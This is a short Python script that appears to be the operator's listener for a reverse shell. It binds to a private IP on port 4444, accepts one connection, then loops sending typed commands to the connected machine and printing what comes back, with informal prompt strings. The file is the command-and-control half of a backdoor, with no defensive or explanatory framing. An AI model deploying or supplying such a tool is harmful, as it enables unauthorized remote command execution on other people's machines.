from socket import *
import subprocess
import os


s = socket(AF_INET , SOCK_STREAM)

s.bind(("192.168.1.151" , 4444))
s.listen(5)

print("vasle dada\n")
c ,addr = s.accept()
print("connected to "+str(addr)+"\n")



while True:
    cmd = input("system  yaro=>" )
    c.sendall(cmd.encode())
    cmd_output = c.recv(12345)
    print(cmd_output.decode())
    print()
    
    
c.close()

